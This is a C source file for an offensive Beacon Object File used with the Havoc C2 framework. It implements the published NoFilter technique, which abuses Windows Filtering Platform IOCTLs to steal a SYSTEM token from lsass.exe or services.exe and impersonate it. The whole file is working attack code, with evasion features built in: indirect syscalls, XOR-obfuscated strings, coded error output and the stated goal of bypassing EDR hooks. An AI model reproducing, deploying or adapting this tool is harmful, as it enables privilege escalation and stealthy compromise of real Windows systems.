/*
 * nofilter.c -- WFP BOF for Havoc C2
 *
 * Error/Status Code Reference (operator only -- not in binary):
 *   E01  BFE service PID not found
 *   E02  SYSTEM target process not found
 *   E03  Failed to open service process (need admin)
 *   E04  Failed to open target process
 *   E05  Handle enumeration failed
 *   E06  WfpAle device handle not found
 *   E07  No suitable token in target
 *   E08  Token insert IOCTL failed (incompatible OS?)
 *   E09  Token query IOCTL failed
 *   E10  Token duplication failed
 *   E11  Thread impersonation failed (fallback applied)
 *   S1   Service PID
 *   S2   Target PID
 *   S3   Debug privilege enabled (t=thread, w=warning)
 *   S4   Scanning handle table
 *   S5   Device handle acquired
 *   S6   Token handle found
 *   S7   Token inserted (LUID)
 *   S8   Token retrieved
 *   S9   Impersonation token created (f=fallback)
 *   OK   Impersonation active
 *
 * Abuses the Windows Filtering Platform (WFP) to duplicate a SYSTEM
 * token entirely in kernel space via tcpip.sys IOCTLs, bypassing
 * user-mode EDR hooks on NtDuplicateToken / DuplicateHandle.
 *
 * Technique: deepinstinct/NoFilter Attack #1 (DEF CON 31)
 *   1. Duplicate WfpAle device handle from BFE service
 *   2. IOCTL 0x128000 — kernel-mode token insertion into WFP hash table
 *   3. IOCTL 0x124008 — retrieve SYSTEM token from hash table
 *   4. Impersonate the SYSTEM token on current thread
 *
 * OPSEC features:
 *   - Token duplication occurs in kernel (tcpip.sys), not user-mode
 *   - No DuplicateToken/DuplicateHandle for the SYSTEM token
 *   - Indirect syscalls for all NT APIs via Havoc NtApi[] table
 *   - XOR-encoded IOC strings, scrubbed after use
 *   - Sanitized COFF symbol names
 *   - Single buffered BeaconOutput call
 *
 * Requirements:
 *   - Administrator privileges (SeDebugPrivilege for handle dup)
 *   - x64 only (Havoc Demon constraint)
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c nofilter.c -o bin/nofilter.x64.o -w
 *
 * Reference:
 *   https://www.deepinstinct.com/blog/nofilter-abusing-windows-filtering-platform-for-privilege-escalation
 */

#include <windows.h>
#include "beacon.h"

/* ================================================================
 * DFR declarations
 * ================================================================ */

/* NTDLL — auto indirect syscall via Havoc NtApi[] table */
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtOpenProcess(PHANDLE, ACCESS_MASK, PVOID, PVOID);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtDuplicateObject(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtDuplicateToken(HANDLE, ACCESS_MASK, PVOID, ULONG, ULONG, PHANDLE);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtQueryObject(HANDLE, ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtSetInformationThread(HANDLE, ULONG, PVOID, ULONG);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtClose(HANDLE);

/* NTDLL — NOT in NtApi[] table, normal ntdll call */
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtDeviceIoControlFile(HANDLE, HANDLE, PVOID, PVOID, PVOID, ULONG, PVOID, ULONG, PVOID, ULONG);
DECLSPEC_IMPORT LONG WINAPI NTDLL$RtlAdjustPrivilege(ULONG, UCHAR, UCHAR, PUCHAR);

/* ADVAPI32 — SCM for BFE PID discovery */
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceW(SC_HANDLE, LPCWSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$QueryServiceStatusEx(SC_HANDLE, SC_STATUS_TYPE, LPBYTE, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

/* MSVCRT */
DECLSPEC_IMPORT int    __cdecl MSVCRT$vsnprintf(char*, size_t, const char*, va_list);
DECLSPEC_IMPORT void * __cdecl MSVCRT$calloc(size_t, size_t);
DECLSPEC_IMPORT void   __cdecl MSVCRT$free(void*);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int    __cdecl MSVCRT$wcscmp(const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int    __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);

/* ================================================================
 * Constants and structures
 * ================================================================ */

#define STATUS_INFO_LENGTH_MISMATCH ((LONG)0xC0000004)
#define STATUS_BUFFER_TOO_SMALL     ((LONG)0xC0000023)
#define STATUS_SUCCESS              ((LONG)0x00000000)
#define MY_SystemProcessInformation  5
#define MY_SystemHandleInformationEx 64
#define MY_ObjectNameInformation     1
#define MY_ObjectTypeInformation     2
#define MY_ThreadImpersonationToken  5
#define MY_TokenImpersonation        2
#define MY_SecurityImpersonation     2
#define MY_DUPLICATE_SAME_ACCESS     0x00000002
#define MY_PROCESS_DUP_HANDLE        0x0040
#define MY_PROCESS_QUERY_INFO        0x0400
#define MY_TOKEN_DUPLICATE           0x0002
#define MY_TOKEN_ALL_ACCESS          0xF01FF

/* WfpAle IOCTL codes (tcpip.sys) */
#define IOCTL_TOK_REF   0x128000
#define IOCTL_TOK_QUERY 0x124008

/* XOR key for string obfuscation */
#define XK 0x37

/* NT structures */
typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } MY_UNICODE_STRING;

typedef struct {
    ULONG  Length;
    HANDLE RootDirectory;
    MY_UNICODE_STRING *ObjectName;
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} MY_OBJECT_ATTRIBUTES;

typedef struct { ULONG_PTR UniqueProcess; ULONG_PTR UniqueThread; } MY_CLIENT_ID;

typedef struct {
    union { LONG Status; PVOID Pointer; };
    ULONG_PTR Information;
} MY_IO_STATUS_BLOCK;

/* SECURITY_QUALITY_OF_SERVICE for NtDuplicateToken */
typedef struct {
    ULONG  Length;
    ULONG  ImpersonationLevel;
    UCHAR  ContextTrackingMode;
    UCHAR  EffectiveOnly;
    USHORT Padding;
} MY_SQOS;

typedef struct {
    PVOID     Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG     GrantedAccess;
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;
    ULONG     HandleAttributes;
    ULONG     Reserved;
} SYS_HANDLE_EX;

typedef struct {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYS_HANDLE_EX Handles[1];
} SYS_HANDLE_INFO_EX;

typedef struct {
    ULONG            NextEntryOffset;
    ULONG            NumberOfThreads;
    LARGE_INTEGER    SpareLi1;
    LARGE_INTEGER    SpareLi2;
    LARGE_INTEGER    SpareLi3;
    LARGE_INTEGER    CreateTime;
    LARGE_INTEGER    UserTime;
    LARGE_INTEGER    KernelTime;
    MY_UNICODE_STRING ImageName;
    LONG             BasePriority;
    HANDLE           UniqueProcessId;
    HANDLE           InheritedFromUniqueProcessId;
} SYSPROC_ENTRY;

typedef struct {
    DWORD dwServiceType; DWORD dwCurrentState; DWORD dwControlsAccepted;
    DWORD dwWin32ExitCode; DWORD dwServiceSpecificExitCode;
    DWORD dwCheckPoint; DWORD dwWaitHint;
    DWORD dwProcessId; DWORD dwServiceFlags;
} MY_SERVICE_STATUS_PROCESS;

typedef struct {
    MY_UNICODE_STRING Name;
    WCHAR             NameBuffer[512];
} OBJECT_NAME_INFO;

typedef struct {
    MY_UNICODE_STRING TypeName;
    ULONG             Reserved[22];
} OBJECT_TYPE_INFO;

/* IOCTL structures — natural alignment (no packing) */
typedef struct { ULONG_PTR ProcessId; ULONG_PTR TokenHandle; } IOCTL_REF_IN;
typedef struct { LUID TokenLuid; } IOCTL_REF_OUT;
typedef struct { LUID TokenLuid; } IOCTL_QRY_IN;
typedef struct { ULONG_PTR TokenHandle; } IOCTL_QRY_OUT;

/* ================================================================
 * Global state — forced to .data (no .bss)
 * ================================================================ */

#define OUT_BUF_SIZE 8192

__attribute__((section(".data"))) static char *g_ob = (char*)(ULONG_PTR)1;
__attribute__((section(".data"))) static int    g_op = 0;
__attribute__((section(".data"))) static int    g_os = 0;

/* ================================================================
 * Output buffer — single BeaconOutput call
 * ================================================================ */

static void out_init(void) {
    g_ob = (char*)MSVCRT$calloc(OUT_BUF_SIZE, 1);
    g_op = 0;
    g_os = OUT_BUF_SIZE;
}

static void out_printf(const char *fmt, ...) {
    if (!g_ob || g_ob == (char*)(ULONG_PTR)1) return;
    int rem = g_os - g_op;
    if (rem <= 1) return;
    va_list a;
    va_start(a, fmt);
    int w = MSVCRT$vsnprintf(g_ob + g_op, rem, fmt, a);
    va_end(a);
    if (w > 0 && w < rem) g_op += w;
}

static void out_flush(void) {
    if (g_ob && g_ob != (char*)(ULONG_PTR)1 && g_op > 0)
        BeaconOutput(CALLBACK_OUTPUT, g_ob, g_op);
    if (g_ob && g_ob != (char*)(ULONG_PTR)1) {
        MSVCRT$memset(g_ob, 0, g_os);
        MSVCRT$free(g_ob);
    }
    g_ob = (char*)(ULONG_PTR)1;
    g_op = 0;
}

/* ================================================================
 * XOR string decode — stack-only, scrubbed after use
 * ================================================================ */

static void xdecw(wchar_t *dst, const unsigned char *enc, int byte_len) {
    int i;
    unsigned char *raw = (unsigned char*)dst;
    for (i = 0; i < byte_len; i++)
        raw[i] = enc[i] ^ XK;
    raw[byte_len] = 0;
    raw[byte_len + 1] = 0;
}

/* ================================================================
 * Encoded strings — all IOC strings XOR'd with 0x37
 *
 * Generated & verified:
 *   python3 -c "XK=0x37; [print(f'0x{ord(c)^XK:02X},0x{0^XK:02X}') for c in s]"
 * ================================================================ */

/* L"\Device\WfpAle" — \=0x5C^37=6B  D=73  e=52  v=41  i=5E  c=54  e=52
 *                      \=6B  W=60  f=51  p=47  A=76  l=5B  e=52 */
static const unsigned char g_enc_devname[] = {
    0x6B,0x37, 0x73,0x37, 0x52,0x37, 0x41,0x37, 0x5E,0x37, 0x54,0x37,
    0x52,0x37, 0x6B,0x37, 0x60,0x37, 0x51,0x37, 0x47,0x37, 0x76,0x37,
    0x5B,0x37, 0x52,0x37
};
#define ENC_DEVNAME_BYTES 28

/* L"BFE" — B=75 F=71 E=72 */
static const unsigned char g_enc_bfe[] = { 0x75,0x37, 0x71,0x37, 0x72,0x37 };
#define ENC_BFE_BYTES 6

/* L"File" — F=71 i=5E l=5B e=52 (for type-safe NtQueryObject filtering) */
static const unsigned char g_enc_file[] = { 0x71,0x37, 0x5E,0x37, 0x5B,0x37, 0x52,0x37 };
#define ENC_FILE_BYTES 8

/* L"Token" — T=63 o=58 k=5C e=52 n=59 */
static const unsigned char g_enc_tkn[] = { 0x63,0x37, 0x58,0x37, 0x5C,0x37, 0x52,0x37, 0x59,0x37 };
#define ENC_TKN_BYTES 10

/* L"lsass.exe" — l=5B s=44 a=56 s=44 s=44 .=19 e=52 x=4F e=52 */
static const unsigned char g_enc_lsa[] = {
    0x5B,0x37, 0x44,0x37, 0x56,0x37, 0x44,0x37,
    0x44,0x37, 0x19,0x37, 0x52,0x37, 0x4F,0x37, 0x52,0x37
};
#define ENC_LSA_BYTES 18

/* L"services.exe" — s=44 e=52 r=45 v=41 i=5E c=54 e=52 s=44 .=19 e=52 x=4F e=52 */
static const unsigned char g_enc_svc[] = {
    0x44,0x37, 0x52,0x37, 0x45,0x37, 0x41,0x37,
    0x5E,0x37, 0x54,0x37, 0x52,0x37, 0x44,0x37,
    0x19,0x37, 0x52,0x37, 0x4F,0x37, 0x52,0x37
};
#define ENC_SVC_BYTES 24

/* ================================================================ */

static DWORD find_svc_pid(const wchar_t *svc_name) {
    DWORD pid = 0;
    SC_HANDLE scm = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return 0;
    SC_HANDLE svc = ADVAPI32$OpenServiceW(scm, svc_name, SERVICE_QUERY_STATUS);
    if (svc) {
        MY_SERVICE_STATUS_PROCESS ssp;
        DWORD needed = 0;
        if (ADVAPI32$QueryServiceStatusEx(svc, 0, (LPBYTE)&ssp, sizeof(ssp), &needed))
            if (ssp.dwCurrentState == SERVICE_RUNNING) pid = ssp.dwProcessId;
        ADVAPI32$CloseServiceHandle(svc);
    }
    ADVAPI32$CloseServiceHandle(scm);
    return pid;
}

static DWORD find_proc_pid(const wchar_t *name) {
    ULONG buf_sz = 0;
    LONG st = NTDLL$NtQuerySystemInformation(MY_SystemProcessInformation, NULL, 0, &buf_sz);
    if (st != STATUS_INFO_LENGTH_MISMATCH || buf_sz == 0) return 0;
    buf_sz += 0x10000;
    PVOID buf = MSVCRT$calloc(buf_sz, 1);
    if (!buf) return 0;
    st = NTDLL$NtQuerySystemInformation(MY_SystemProcessInformation, buf, buf_sz, &buf_sz);
    if (st != STATUS_SUCCESS) { MSVCRT$free(buf); return 0; }
    DWORD pid = 0;
    SYSPROC_ENTRY *e = (SYSPROC_ENTRY*)buf;
    for (;;) {
        if (e->ImageName.Buffer && e->ImageName.Length > 0)
            if (MSVCRT$_wcsicmp(e->ImageName.Buffer, name) == 0)
                { pid = (DWORD)(ULONG_PTR)e->UniqueProcessId; break; }
        if (e->NextEntryOffset == 0) break;
        e = (SYSPROC_ENTRY*)((BYTE*)e + e->NextEntryOffset);
    }
    MSVCRT$free(buf);
    return pid;
}

static HANDLE open_proc(DWORD pid, ACCESS_MASK access) {
    HANDLE h = NULL;
    MY_CLIENT_ID cid;
    MY_OBJECT_ATTRIBUTES oa;
    MSVCRT$memset(&cid, 0, sizeof(cid));
    MSVCRT$memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);
    cid.UniqueProcess = (ULONG_PTR)pid;
    LONG st = NTDLL$NtOpenProcess(&h, access, &oa, &cid);
    return (st == STATUS_SUCCESS) ? h : NULL;
}

/* ================================================================
 * check_type — ObjectTypeInformation query (SAFE, never deadlocks)
 *
 * NtQueryObject(ObjectTypeInformation) never blocks, unlike
 * ObjectNameInformation which can deadlock on named pipes / ALPC.
 * ================================================================ */

static BOOL check_type(HANDLE dup, const wchar_t *expected) {
    char type_buf[512];
    MSVCRT$memset(type_buf, 0, sizeof(type_buf));
    ULONG ret_len = 0;
    LONG qs = NTDLL$NtQueryObject(dup, MY_ObjectTypeInformation,
        type_buf, sizeof(type_buf), &ret_len);
    if (qs != STATUS_SUCCESS) return FALSE;
    OBJECT_TYPE_INFO *ti = (OBJECT_TYPE_INFO*)type_buf;
    if (!ti->TypeName.Buffer) return FALSE;
    return (MSVCRT$wcscmp(ti->TypeName.Buffer, expected) == 0);
}

/* ================================================================
 * find_handles — scan system handle table
 *
 * FIX #3: Uses ObjectTypeInformation (never deadlocks) to filter
 * handles BEFORE calling ObjectNameInformation. Only queries name
 * on confirmed "File" type handles to prevent NtQueryObject deadlock
 * on named pipes / ALPC ports / synchronous file objects.
 * ================================================================ */

static LONG find_handles(
    DWORD bfe_pid, DWORD sys_pid,
    HANDLE bfe_proc, HANDLE sys_proc,
    HANDLE *out_ale, ULONG_PTR *out_tok_val, USHORT *out_tok_type
) {
    *out_ale = NULL; *out_tok_val = 0; *out_tok_type = 0;

    wchar_t dev_name[32], file_type[16], tkn_type[16];
    MSVCRT$memset(dev_name, 0, sizeof(dev_name));
    MSVCRT$memset(file_type, 0, sizeof(file_type));
    MSVCRT$memset(tkn_type, 0, sizeof(tkn_type));
    xdecw(dev_name, g_enc_devname, ENC_DEVNAME_BYTES);
    xdecw(file_type, g_enc_file, ENC_FILE_BYTES);
    xdecw(tkn_type, g_enc_tkn, ENC_TKN_BYTES);

    ULONG buf_sz = 0x100000;
    PVOID buf = NULL;
    LONG st;
    for (int attempt = 0; attempt < 8; attempt++) {
        buf = MSVCRT$calloc(buf_sz, 1);
        if (!buf) { st = STATUS_BUFFER_TOO_SMALL; break; }
        st = NTDLL$NtQuerySystemInformation(MY_SystemHandleInformationEx, buf, buf_sz, &buf_sz);
        if (st == STATUS_SUCCESS) break;
        MSVCRT$free(buf); buf = NULL; buf_sz *= 2;
    }
    if (st != STATUS_SUCCESS || !buf) {
        MSVCRT$memset(dev_name, 0, sizeof(dev_name));
        MSVCRT$memset(file_type, 0, sizeof(file_type));
        MSVCRT$memset(tkn_type, 0, sizeof(tkn_type));
        if (buf) MSVCRT$free(buf);
        return st;
    }

    SYS_HANDLE_INFO_EX *info = (SYS_HANDLE_INFO_EX*)buf;
    HANDLE cur_proc = (HANDLE)(LONG_PTR)-1;
    USHORT file_type_idx = 0, token_type_idx = 0;

    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
        SYS_HANDLE_EX *he = &info->Handles[i];

        /* --- WfpAle device in BFE --- */
        if (!*out_ale && he->UniqueProcessId == (ULONG_PTR)bfe_pid) {
            if (he->GrantedAccess == 0) continue;
            if (file_type_idx != 0 && he->ObjectTypeIndex != file_type_idx) continue;

            HANDLE dup = NULL;
            LONG ds = NTDLL$NtDuplicateObject(bfe_proc, (HANDLE)he->HandleValue,
                cur_proc, &dup, 0, 0, MY_DUPLICATE_SAME_ACCESS);
            if (ds != STATUS_SUCCESS || !dup) continue;

            /* Type check FIRST — safe, never deadlocks */
            if (file_type_idx == 0) {
                if (check_type(dup, file_type))
                    file_type_idx = he->ObjectTypeIndex;
                else { NTDLL$NtClose(dup); continue; }
            }

            /* Now safe to query name on confirmed File handle */
            OBJECT_NAME_INFO oni;
            MSVCRT$memset(&oni, 0, sizeof(oni));
            ULONG ret_len = 0;
            LONG qs = NTDLL$NtQueryObject(dup, MY_ObjectNameInformation,
                &oni, sizeof(oni), &ret_len);
            if (qs == STATUS_SUCCESS && oni.Name.Buffer &&
                MSVCRT$wcscmp(oni.Name.Buffer, dev_name) == 0) {
                *out_ale = dup; dup = NULL;
            }
            if (dup) NTDLL$NtClose(dup);
        }

        /* --- Token in SYSTEM process --- */
        if (!*out_tok_val && he->UniqueProcessId == (ULONG_PTR)sys_pid) {
            if (!(he->GrantedAccess & MY_TOKEN_DUPLICATE)) continue;
            if (token_type_idx != 0 && he->ObjectTypeIndex == token_type_idx) {
                *out_tok_val = he->HandleValue;
                *out_tok_type = he->ObjectTypeIndex;
            } else if (token_type_idx == 0) {
                HANDLE dup = NULL;
                LONG ds = NTDLL$NtDuplicateObject(sys_proc, (HANDLE)he->HandleValue,
                    cur_proc, &dup, 0, 0, MY_DUPLICATE_SAME_ACCESS);
                if (ds == STATUS_SUCCESS && dup) {
                    if (check_type(dup, tkn_type)) {
                        token_type_idx = he->ObjectTypeIndex;
                        *out_tok_val = he->HandleValue;
                        *out_tok_type = he->ObjectTypeIndex;
                    }
                    NTDLL$NtClose(dup);
                }
            }
        }

        if (*out_ale && *out_tok_val) break;
    }

    MSVCRT$free(buf);
    MSVCRT$memset(dev_name, 0, sizeof(dev_name));
    MSVCRT$memset(file_type, 0, sizeof(file_type));
    MSVCRT$memset(tkn_type, 0, sizeof(tkn_type));
    return STATUS_SUCCESS;
}

/* ================================================================ */

static LONG ioc_ref(HANDLE ale, DWORD pid, ULONG_PTR tok_val, LUID *out_luid) {
    IOCTL_REF_IN in_buf; IOCTL_REF_OUT out_buf; MY_IO_STATUS_BLOCK iosb;
    MSVCRT$memset(&in_buf, 0, sizeof(in_buf));
    MSVCRT$memset(&out_buf, 0, sizeof(out_buf));
    MSVCRT$memset(&iosb, 0, sizeof(iosb));
    in_buf.ProcessId = (ULONG_PTR)pid;
    in_buf.TokenHandle = tok_val;
    LONG st = NTDLL$NtDeviceIoControlFile(ale, NULL, NULL, NULL, &iosb,
        IOCTL_TOK_REF, &in_buf, sizeof(in_buf), &out_buf, sizeof(out_buf));
    if (st == STATUS_SUCCESS) {
        out_luid->LowPart = out_buf.TokenLuid.LowPart;
        out_luid->HighPart = out_buf.TokenLuid.HighPart;
    }
    return st;
}

static LONG ioc_qry(HANDLE ale, LUID *luid, HANDLE *out_token) {
    IOCTL_QRY_IN in_buf; IOCTL_QRY_OUT out_buf; MY_IO_STATUS_BLOCK iosb;
    MSVCRT$memset(&in_buf, 0, sizeof(in_buf));
    MSVCRT$memset(&out_buf, 0, sizeof(out_buf));
    MSVCRT$memset(&iosb, 0, sizeof(iosb));
    in_buf.TokenLuid.LowPart = luid->LowPart;
    in_buf.TokenLuid.HighPart = luid->HighPart;
    LONG st = NTDLL$NtDeviceIoControlFile(ale, NULL, NULL, NULL, &iosb,
        IOCTL_TOK_QUERY, &in_buf, sizeof(in_buf), &out_buf, sizeof(out_buf));
    if (st == STATUS_SUCCESS) *out_token = (HANDLE)out_buf.TokenHandle;
    return st;
}

/* ================================================================
 * BOF entry point
 * ================================================================ */

void go(char *args, int alen)
{
    DWORD target_pid = 0;
    if (alen > 0) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        target_pid = (DWORD)BeaconDataInt(&parser);
    }

    out_init();
    out_printf("[*] Starting...\n");

    /* Phase 1: Find BFE service PID */
    wchar_t bfe_name[8];
    MSVCRT$memset(bfe_name, 0, sizeof(bfe_name));
    xdecw(bfe_name, g_enc_bfe, ENC_BFE_BYTES);
    DWORD bfe_pid = find_svc_pid(bfe_name);
    MSVCRT$memset(bfe_name, 0, sizeof(bfe_name));
    if (bfe_pid == 0) {
        out_printf("[!] E01\n");
        out_flush(); return;
    }
    out_printf("[*] S1:%lu\n", bfe_pid);

    /* Phase 2: Find SYSTEM target process */
    if (target_pid == 0) {
        wchar_t pname[32];
        MSVCRT$memset(pname, 0, sizeof(pname));
        xdecw(pname, g_enc_lsa, ENC_LSA_BYTES);
        target_pid = find_proc_pid(pname);
        MSVCRT$memset(pname, 0, sizeof(pname));
        if (target_pid == 0) {
            MSVCRT$memset(pname, 0, sizeof(pname));
            xdecw(pname, g_enc_svc, ENC_SVC_BYTES);
            target_pid = find_proc_pid(pname);
            MSVCRT$memset(pname, 0, sizeof(pname));
        }
    }
    if (target_pid == 0) {
        out_printf("[!] E02\n");
        out_flush(); return;
    }
    out_printf("[*] S2:%lu\n", target_pid);

    /* Phase 3: Enable SeDebugPrivilege, then open process handles
     *
     * Admin tokens have SeDebugPrivilege but it is Disabled by default.
     * NtOpenProcess on SYSTEM processes requires it to be Enabled.
     * RtlAdjustPrivilege(20, TRUE, FALSE, &prev) enables it for the
     * current process token.
     *
     * Non-fatal: if already enabled or if running under an impersonation
     * context, this may fail (0xc0000022). We warn and continue since
     * NtOpenProcess may still succeed. */
    UCHAR prev_state = 0;
    LONG priv_st = NTDLL$RtlAdjustPrivilege(20 /* SeDebugPrivilege */, 1, 0, &prev_state);
    if (priv_st == STATUS_SUCCESS) {
        out_printf("[+] S3\n");
    } else {
        /* Try thread-level adjustment as fallback (for impersonation contexts) */
        priv_st = NTDLL$RtlAdjustPrivilege(20, 1, 1 /* AdjustThread */, &prev_state);
        if (priv_st == STATUS_SUCCESS) {
            out_printf("[+] S3t\n");
        } else {
            out_printf("[*] S3w:0x%08lx\n",
                       (ULONG)priv_st);
        }
    }

    HANDLE bfe_proc = open_proc(bfe_pid, MY_PROCESS_DUP_HANDLE | MY_PROCESS_QUERY_INFO);
    if (!bfe_proc) {
        out_printf("[!] E03\n");
        out_flush(); return;
    }
    HANDLE sys_proc = open_proc(target_pid, MY_PROCESS_DUP_HANDLE | MY_PROCESS_QUERY_INFO);
    if (!sys_proc) {
        out_printf("[!] E04\n");
        NTDLL$NtClose(bfe_proc); out_flush(); return;
    }

    /* Phase 4: Enumerate handles */
    out_printf("[*] S4\n");
    HANDLE ale_handle = NULL;
    ULONG_PTR tok_val = 0;
    USHORT tok_type = 0;
    LONG st = find_handles(bfe_pid, target_pid, bfe_proc, sys_proc,
                           &ale_handle, &tok_val, &tok_type);
    NTDLL$NtClose(bfe_proc); bfe_proc = NULL;

    if (st != STATUS_SUCCESS) {
        out_printf("[!] E05:0x%08lx\n", (ULONG)st);
        NTDLL$NtClose(sys_proc); out_flush(); return;
    }
    if (!ale_handle) {
        out_printf("[!] E06\n");
        NTDLL$NtClose(sys_proc); out_flush(); return;
    }
    out_printf("[+] S5\n");
    if (tok_val == 0) {
        out_printf("[!] E07:%lu\n", target_pid);
        NTDLL$NtClose(ale_handle); NTDLL$NtClose(sys_proc); out_flush(); return;
    }
    out_printf("[+] S6:0x%llx/%u\n",
               (unsigned long long)tok_val, (unsigned)tok_type);
    NTDLL$NtClose(sys_proc); sys_proc = NULL;

    /* Phase 5: IOCTL — insert token into kernel hash table */
    LUID token_luid;
    MSVCRT$memset(&token_luid, 0, sizeof(token_luid));
    st = ioc_ref(ale_handle, target_pid, tok_val, &token_luid);
    if (st != STATUS_SUCCESS) {
        out_printf("[!] E08:0x%08lx\n", (ULONG)st);
        NTDLL$NtClose(ale_handle); out_flush(); return;
    }
    out_printf("[+] S7:%08lx:%08lx\n",
               token_luid.HighPart, token_luid.LowPart);

    /* Phase 6: IOCTL — retrieve SYSTEM token */
    HANDLE raw_token = NULL;
    st = ioc_qry(ale_handle, &token_luid, &raw_token);
    NTDLL$NtClose(ale_handle); ale_handle = NULL;
    if (st != STATUS_SUCCESS || !raw_token) {
        out_printf("[!] E09:0x%08lx\n", (ULONG)st);
        out_flush(); return;
    }
    out_printf("[+] S8\n");

    /* Phase 7: Duplicate as impersonation token
     *
     * FIX #2: Must create TokenImpersonation (not TokenPrimary).
     * NtSetInformationThread(ThreadImpersonationToken) requires an
     * impersonation token. Passing a primary token would fail with
     * STATUS_BAD_TOKEN_TYPE.
     *
     * SECURITY_QUALITY_OF_SERVICE with SecurityImpersonation level
     * is set explicitly via ObjectAttributes. */
    MY_SQOS sqos;
    MSVCRT$memset(&sqos, 0, sizeof(sqos));
    sqos.Length = sizeof(sqos);
    sqos.ImpersonationLevel = MY_SecurityImpersonation;

    MY_OBJECT_ATTRIBUTES dup_oa;
    MSVCRT$memset(&dup_oa, 0, sizeof(dup_oa));
    dup_oa.Length = sizeof(dup_oa);
    dup_oa.SecurityQualityOfService = &sqos;

    HANDLE imp_token = NULL;
    st = NTDLL$NtDuplicateToken(
        raw_token,
        MY_TOKEN_ALL_ACCESS,
        &dup_oa,
        FALSE,                 /* EffectiveOnly */
        MY_TokenImpersonation, /* TokenType = TokenImpersonation (2) */
        &imp_token
    );
    NTDLL$NtClose(raw_token); raw_token = NULL;

    if (st != STATUS_SUCCESS || !imp_token) {
        out_printf("[!] E10:0x%08lx\n", (ULONG)st);
        out_flush(); return;
    }
    out_printf("[+] S9\n");

    /* Phase 8: Impersonate */
    HANDLE cur_thread = (HANDLE)(LONG_PTR)-2;
    st = NTDLL$NtSetInformationThread(cur_thread, MY_ThreadImpersonationToken,
        &imp_token, sizeof(HANDLE));

    if (st != STATUS_SUCCESS) {
        out_printf("[!] E11:0x%08lx\n", (ULONG)st);
        BeaconUseToken(imp_token);
        out_printf("[+] S9f\n");
    } else {
        BeaconUseToken(imp_token);
        out_printf("[+] OK\n");
    }

    /* FIX #4: Do NOT close imp_token after BeaconUseToken.
     * Havoc may store the raw handle for token-revert.
     * Closing it risks a dangling handle. Will be cleaned
     * up on token-revert or Demon exit. */

    out_printf("\n[*] Done.\n");
    out_flush();
}
